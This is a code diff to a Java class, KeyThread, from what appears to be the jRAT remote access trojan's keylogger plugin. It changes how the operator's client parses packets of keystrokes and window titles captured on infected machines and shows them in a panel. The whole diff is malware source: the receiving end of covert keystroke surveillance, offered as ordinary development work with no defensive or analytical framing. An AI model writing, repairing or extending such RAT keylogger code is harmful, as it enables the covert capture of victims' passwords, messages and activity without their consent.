@@ -2,6 +2,7 @@ package pro.jrat.client.keylogger;
 
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
+import java.util.Random;
 
 import pro.jrat.api.PacketBuilder;
 import pro.jrat.api.RATObject;
@@ -26,14 +27,14 @@ public class KeyThread implements Runnable {
 
 				server.addToSendQueue(new PacketBuilder(Plugin.STATUS_HEADER, server) {
 					@Override
-					public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {
+					public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {						
 						int len = dis.readInt();
 						System.out.println("Length: " + len);
-
+						
 						for (int i = 0; i < len; i++) {
-							byte header = dis.readByte();
+							boolean isKey = dis.readBoolean();
 
-							if (header == Plugin.KEY_HEADER) {
+							if (isKey) {
 								char ckey = dis.readChar();
 
 								String key = Character.toString(ckey);
@@ -49,7 +50,7 @@ public class KeyThread implements Runnable {
 								if (panel != null) {
 									panel.append(key);
 								}
-							} else if (header == Plugin.TITLE_HEADER) {
+							} else {
 								String title = dis.readUTF();
 
 								if (panel != null) {
@@ -57,9 +58,6 @@ public class KeyThread implements Runnable {
 								}
 							}
 						}
-						
-						System.out.println("Wrote packet...");
-
 					}
 				});
 
